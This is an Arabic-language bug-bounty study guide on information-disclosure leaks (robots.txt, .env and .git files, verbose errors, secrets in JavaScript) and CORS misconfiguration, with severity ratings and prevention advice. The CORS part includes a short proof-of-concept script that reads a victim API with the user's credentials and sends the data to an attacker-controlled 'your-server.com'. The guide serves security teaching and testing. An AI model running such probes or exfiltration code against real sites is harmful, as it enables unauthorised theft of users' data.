### 1. **Information Disclosure** (تسريب المعلومات) – اللي بيحصل لما الموقع "يفضح نفسه" بدون ما يقصد

**الفكرة الأساسية:**  
الموقع بيرمي معلومات حساسة أو مفيدة للمهاجم في مكان يقدر يشوفها أي حد (سورس الكود، error messages، headers، files عامة... إلخ).

**أشهر الأماكن اللي بنلاقي فيها تسريب (Common Sources)**

| المكان                               | إيه اللي ممكن يتسرّب؟                                                  | إزاي تلاقيه؟ (Quick Checks)                          | Severity (غالباً)            |
| ------------------------------------ | ---------------------------------------------------------------------- | ---------------------------------------------------- | ---------------------------- |
| **robots.txt**                       | أسماء فولدرات مخفية (/admin, /backup, /dev, /test)                     | افتح `https://target.com/robots.txt`                 | Low → Medium                 |
| **Directory Listing**                | محتوى فولدرات مفتوحة (config files, backups, source code)              | جرب `/images/` أو `/uploads/` أو `/backup/`          | Medium → High                |
| **Error Messages (Verbose)**         | أسماء جداول DB، أسماء ملفات، مسارات كاملة، إصدارات برامج، stack traces | حط `'` في حقل بحث أو login → شوف الإيرور             | Medium → Critical            |
| **Source Code Comments**             | TODOs, API keys, internal URLs, debug flags (`// TODO: fix later`)     | Ctrl+U → ابحث عن `TODO`, `FIXME`, `key=`, `password` | Medium → High                |
| **JavaScript Files**                 | Hardcoded API keys, tokens, internal endpoints, debug=true             | ابحث في .js عن `api_key`, `Bearer`, `secret`         | High → Critical              |
| **Backup Files**                     | .bak, .old, .swp, ~ , .git , .env , config.php.save                    | جرب `/index.php.bak` أو `/.env` أو `/.git/HEAD`      | Critical                     |
| **HTTP Headers**                     | Server: Apache/2.4.41, X-Powered-By: PHP/8.1, X-Drupal-Cache...        | Burp → Response headers                              | Low → Medium                 |
| **Login / Registration Differences** | "User not found" vs "Password incorrect" → يعرف إن الإيميل موجود       | جرب إيميلات مختلفة في login                          | Medium (Account Enumeration) |
| **Time-based Differences**           | الصفحة تأخرت لو اليوزر موجود (hashing بطيء)                            | قيس الوقت بـ Burp Intruder                           | Medium                       |

**إزاي تقيم الخطورة (Severity) صح؟**  
- **Critical**: لو في API key فعال، DB credentials، source code كامل، أو بيانات شخصية/مالية.  
- **High**: لو في مسار داخلي + إصدار برنامج قديم فيه CVE معروف.  
- **Medium**: Account enumeration, verbose errors بدون exploit مباشر.  
- **Low**: مجرد إصدار Apache أو PHP بدون ثغرة معروفة.

**نصيحة عملية في 2026**  
- استخدمي **Burp Suite** → Target → Site map → right click → Engagement tools → Search في كل الـ responses عن كلمات زي `key`, `password`, `secret`, `TODO`.  
- جربي **dirsearch** أو **gobuster** مع wordlist كبيرة للبحث عن backups.  
- في bug bounty: أبلغي حتى لو Low، لأن التسريب الصغير ممكن يكون جزء من chain attack.

### 2. **CORS Misconfiguration** – لما الموقع يفتح أبوابه لأي حد بالغلط

**الفكرة الأساسية:**  
الـ CORS هو اللي بيقول للمتصفح: "مين مسموح له يقرأ ردود الـ API ده؟"  
لو اتظبط غلط، موقع خبيث (hacker.com) يقدر يطلب بيانات حساسة من موقعك ويقراها باسم المستخدم (مع الكوكيز/credentials).

**أشهر الأخطاء اللي بنلاقيها (Vulnerable Patterns)**

| الخطأ                                 | Header المشكوك فيه                            | إزاي تكتشفيه؟                                                            | Severity (لو credentials: true) | Exploit Example                 |
| ------------------------------------- | --------------------------------------------- | ------------------------------------------------------------------------ | ------------------------------- | ------------------------------- |
| **Wildcard (*)**                      | Access-Control-Allow-Origin: *                | شوف الـ response headers في أي API call                                  | Critical                        | أي موقع خبيث يقدر يقرأ البيانات |
| **Reflected Origin**                  | Access-Control-Allow-Origin: https://evil.com | غير الـ Origin header في Burp Repeater لقيمة عشوائية → لو رجع نفس القيمة | Critical                        | Origin: https://attacker.com    |
| **Null Origin**                       | Access-Control-Allow-Origin: null             | ابعت Origin: null في request → لو رجع null + credentials: true           | High → Critical                 | iframe sandbox exploit          |
| **Suffix Confusion**                  | endsWith("victim.com")                        | Origin: https://attacker-victim.com → لو قبلها                           | Critical                        | hackvictim.com                  |
| **Prefix Confusion**                  | startsWith("https://victim.com")              | Origin: https://victim.com.evil.net → لو قبلها                           | Critical                        | victim.com.evil.net             |
| **Trusting Subdomain with XSS**       | Whitelist: *.victim.com                       | لو لقيتي XSS في أي subdomain → chain مع CORS                             | Critical                        | XSS → steal API data            |
| **HTTP Subdomain in HTTPS Whitelist** | Whitelist: http://api.victim.com              | Man-in-the-Middle على HTTP subdomain → inject JS                         | High → Critical                 | Wi-Fi public attack             |

**إزاي تختبري CORS misconfig**

1. افتحي Burp → Proxy → Intercept on  
2. اعملي أي طلب AJAX أو API call (مثل fetch sensitive data)  
3. في الـ response شوفي:  
   - Access-Control-Allow-Origin  
   - Access-Control-Allow-Credentials: true؟  
4. في Repeater:  
   - غيري الـ Origin header لـ `https://evil.com`  
   - لو رجع Access-Control-Allow-Origin: https://evil.com → vulnerable  
   - جربي `null`, `https://victim.com.evil.net`, `https://evil-victim.com`  
5. لو credentials: true موجود → جربي PoC بسيط في HTML محلي:
   ```html
   <script>
   fetch('https://victim.com/api/sensitive', {credentials: 'include'})
     .then(r => r.text())
     .then(data => fetch('https://your-server.com/log?data='+btoa(data)));
   </script>
   ```
   لو البيانات وصلتلك → Critical!

**الفرق المهم: CORS vs CSRF**
- CORS → يحمي **قراءة** الـ response (مش بيمنع إرسال الطلب).  
- CSRF → يحمي **تنفيذ** أوامر (زي تغيير باسوورد) بدون إذن.  
→ لو CORS غلط → تقدري تسرقي بيانات (read).  
→ لو CSRF موجود بدون token → تقدري تعدلي بيانات (write).

**Prevention (للمبرمجين – الطريقة الصح)**
- استخدمي **strict whitelist** دايمًا (array ثابتة).  
- لو credentials: true → ممنوع `*` أو `null`.  
- استخدمي `Vary: Origin` header عشان الكاش ما يتلاعبش.  
- افحصي الـ Origin مقابل قائمة موثوقة مش regex ضعيف.

**في bug bounty**   
- CORS misconfig مع credentials → High/Critical، خاصة لو في sensitive API (profile, payments, messages).  
- أبلغي PoC واضح (screenshot + HTML file يثبت السرقة).  
- chain مع XSS في subdomain → jackpot

And Done :)